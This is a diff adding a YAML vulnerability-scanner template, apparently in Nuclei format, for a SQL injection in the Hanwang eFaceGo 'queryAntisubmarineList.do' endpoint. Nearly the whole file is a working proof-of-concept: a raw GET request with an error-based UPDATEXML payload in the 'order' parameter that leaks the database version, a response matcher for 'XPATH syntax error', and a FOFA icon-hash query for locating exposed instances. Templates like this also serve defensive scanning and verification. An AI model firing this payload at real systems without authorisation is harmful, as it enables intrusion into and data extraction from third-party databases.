@@ -1,0 +1,32 @@
+id: hanwang-queryAntisubmarineList-sqli
+info:
+  name: hanwang queryAntisubmarineList.do - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - 
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: icon_hash="1380907357"
+    tips:
+    repair:
+    version:
+  tags: hanwang,efacego,sqli
+
+http:
+  - raw:
+      - |
+        GET /manage/antisubmarine/queryAntisubmarineList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: queryAntisubmarineList.do
+        dsl:
+          - status_code == 200
+          - contains_all(body,'XPATH syntax error')
+        condition: and
+
